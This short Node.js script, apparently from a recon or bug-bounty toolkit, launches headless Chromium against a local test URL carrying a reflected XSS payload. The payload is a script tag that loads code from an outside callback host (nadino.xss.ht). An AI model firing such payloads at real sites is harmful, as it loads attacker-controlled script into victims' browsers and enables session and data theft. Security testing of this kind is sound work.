var cmd = require('./recon/amass.js')
var util =require ('./utils.js')
var url = require('url')
var path = require('path')

var spawnHeadlessChromium = require('run-headless-chromium').spawn;

var proc = spawnHeadlessChromium([
    // Flags forwarded to Chromium:
    'http://127.0.0.1:8989/?xss="><script src=https://nadino.xss.ht></script>',
], {
    stdio: 'inherit',
});
proc.on('close', function() {
    clearTimeout(delayedExit);
    console.log('Headless Chromium exited!');
});
var delayedExit = setTimeout(function() {
    console.log('Chrome did not exit within a few seconds, sending SIGINT...');
    // Graceful exit - allow run-headless-chromium to exit Chrome and Xvfb.
    proc.kill('SIGINT');
    // If you do proc.kill(); then Chrome and Xvfb may still hang around.
}, 5000);
